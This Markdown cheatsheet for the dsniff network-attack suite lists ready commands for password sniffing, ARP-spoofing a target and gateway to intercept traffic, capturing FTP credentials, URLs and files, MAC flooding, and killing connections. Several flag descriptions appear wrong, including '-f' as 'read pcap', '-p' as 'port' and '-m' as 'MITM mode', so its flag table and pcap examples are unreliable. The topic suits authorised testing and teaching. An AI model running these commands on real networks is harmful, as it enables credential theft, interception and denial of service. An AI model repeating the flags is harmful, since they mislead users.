---
title: "dsniff Cheatsheet"
description: "Quick reference guide for dsniff network audit and penetration testing tools"
tool: dsniff
category: network-sniffing
difficulty: intermediate
requires_root: true
---

# dsniff Cheatsheet

## Quick Start

```bash
# Install dsniff
sudo apt install dsniff

# Basic password sniffing
sudo dsniff -i eth0

# Sniff without DNS resolution
sudo dsniff -i eth0 -n

# Capture HTTP URLs
sudo urlsnarf -i eth0

# Extract files from traffic
sudo filesnarf -i eth0

# ARP spoof target
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

## Capture Filters

```bash
# Filter by host
sudo dsniff -i eth0 'host 192.168.1.100'

# Filter by subnet
sudo dsniff -i eth0 'net 192.168.1.0/24'

# Filter by port
sudo dsniff -i eth0 'port 21'           # FTP
sudo dsniff -i eth0 'port 23'           # Telnet
sudo dsniff -i eth0 'port 80'           # HTTP
sudo dsniff -i eth0 'port 110'          # POP3
sudo dsniff -i eth0 'port 143'          # IMAP

# Complex filters
sudo dsniff -i eth0 '(tcp port 80 or tcp port 443) and host 192.168.1.100'
```

## Analysis

```bash
# Read from pcap file
dsniff -f capture.pcap

# Verbose output
sudo dsniff -i eth0 -v

# Debug mode
sudo dsniff -i eth0 -d

# Limit snap length
sudo dsniff -i eth0 -s 96
```

## Common Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-i` | Network interface | `dsniff -i eth0` |
| `-f` | Read pcap file | `dsniff -f capture.pcap` |
| `-n` | No DNS resolution | `dsniff -i eth0 -n` |
| `-p` | Specify port | `dsniff -i eth0 -p 80` |
| `-v` | Verbose output | `dsniff -i eth0 -v` |
| `-m` | Enable MITM mode | `dsniff -i eth0 -m` |
| `-d` | Debug mode | `dsniff -i eth0 -d` |
| `-s` | Snap length | `dsniff -i eth0 -s 96` |

## Tool-Specific Commands

### dsniff (Password Sniffer)
```bash
sudo dsniff -i eth0 -n
sudo dsniff -i eth0 'port 21 or port 23'
```

### arpspoof (ARP Poisoning)
```bash
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
sudo arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1
```

### urlsnarf (URL Capture)
```bash
sudo urlsnarf -i eth0
sudo urlsnarf -i eth0 'tcp port 80'
```

### filesnarf (File Extraction)
```bash
sudo filesnarf -i eth0
sudo filesnarf -i eth0 'tcp port 21'
```

### msgsnarf (Message Capture)
```bash
sudo msgsnarf -i eth0
```

### macof (MAC Flooding)
```bash
sudo macof -i eth0
sudo macof -i eth0 -x
```

### tcpkill (Connection Killer)
```bash
sudo tcpkill -i eth0 'host 192.168.1.100 and port 80'
```

### tcpnice (Slow Connection)
```bash
sudo tcpnice -i eth0 'host 192.168.1.100'
```

## Examples

### Basic Password Sniffing
```bash
sudo dsniff -i eth0 -n
```

### ARP Spoofing Attack
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof target
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &

# Start sniffing
sudo dsniff -i eth0 -n
```

### Capture FTP Credentials
```bash
sudo dsniff -i eth0 'port 21'
```

### Capture HTTP Traffic
```bash
sudo urlsnarf -i eth0 'tcp port 80'
```

### Flood Network
```bash
sudo macof -i eth0 -x
```

## Chaining with Other Tools

```bash
# Pipe to grep
sudo dsniff -i eth0 -n | grep -i "password"

# Log to file
sudo dsniff -i eth0 -n 2>&1 | tee audit.log

# Use in tmux session
tmux new-session -d -s dsniff 'sudo dsniff -i eth0 -n'

# Process pcap with tcpdump
tcpdump -r capture.pcap -w filtered.pcap 'tcp port 80'

# Analyze with Wireshark
wireshark -r capture.pcap -Y "http"
```

## Quick Reference

### Target IPs
- Gateway: `192.168.1.1`
- Target: `192.168.1.100`
- Subnet: `192.168.1.0/24`

### Common Ports
- FTP: 21
- Telnet: 23
- HTTP: 80
- HTTPS: 443
- POP3: 110
- IMAP: 143
- SMTP: 25
- DNS: 53

### Protocol Keywords
- `host` - Filter by IP
- `net` - Filter by subnet
- `port` - Filter by port
- `src` - Source address/port
- `dst` - Destination address/port
- `tcp` - TCP protocol
- `udp` - UDP protocol
- `icmp` - ICMP protocol
